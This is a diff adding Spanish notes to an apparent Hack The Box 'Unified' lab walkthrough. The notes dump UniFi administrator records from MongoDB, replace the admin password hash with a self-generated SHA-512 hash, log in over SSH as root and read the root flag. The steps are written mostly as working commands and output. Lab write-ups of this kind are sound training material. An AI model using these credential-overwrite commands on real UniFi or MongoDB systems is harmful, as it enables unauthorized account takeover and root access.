@@ -745,3 +745,61 @@ unifi@unified:/usr/lib/unifi/bin$
 
 cat hashes.txt | sed -e 's/"x_shadow"//g' | tr ':' ' ' | sed -e 's/"//g' | sed -e 's/,//g' > clean_hashes.txt
 
+La contraseña no se puede crackear
+
+CAMBIO DE CONTRASEÑA ADMINISTRADOR en MONGODB por UNA PROPIA
+================================================================================================================================================================
+
+MONGO
+=====
+mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);"`
+10.129.237.149
+
+
+Creamos nueva contraseña en local
+----------------------------------
+La contraseña es de tipo SHA512 (por el $6)
+
+└─$ mkpasswd -m sha-512 Password1234
+$6$fkPl.lGMhk9oxMdp$.KRwdtLB3YlWLhf0w6lu/swzjPc5VQK1P.6rkwapa.xB1v28/6HPm4lGF37gUJCaaNi2vV6.3G4w6O4NSX1bC/
+
+En máquina victima
+------------------
+mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"SHA_512 Hash Generated"}})'
+
+mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("61ce278f46e0fb0012d47ee4")},{$set:{"x_shadow":"$6$fkPl.lGMhk9oxMdp$.KRwdtLB3YlWLhf0w6lu/swzjPc5VQK1P.6rkwapa.xB1v28/6HPm4lGF37gUJCaaNi2vV6.3G4w6O4NSX1bC/"}})'
+
+
+Verificando contraseña cambiada:
+---------------------------
+mongo --port 27117 ace --eval "db.admin.find().forEach(printjson);" | grep -B5 "1bC"
+
+
+NotACrackablePassword4U2022
+
+
+
+┌──(kali㉿kali)-[~/Hacking/hackthebox/TIER2/unified]
+└─$ ssh root@unified    
+The authenticity of host 'unified (10.129.237.149)' can't be established.
+ED25519 key fingerprint is SHA256:RoZ8jwEnGGByxNt04+A/cdluslAwhmiWqG3ebyZko+A.
+This key is not known by any other names
+Are you sure you want to continue connecting (yes/no/[fingerprint])? y
+Please type 'yes', 'no' or the fingerprint: yes
+Warning: Permanently added 'unified' (ED25519) to the list of known hosts.
+root@unified's password: 
+Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-77-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+
+root@unified:~# whoami
+root
+root@unified:~# cd
+root@unified:~# ls
+root.txt
+root@unified:~# cat root.txt
+e50bc93c75b634e4b272d2f771c33681  <<<<<<<<<<<<<<<<<<<<<<<<
+
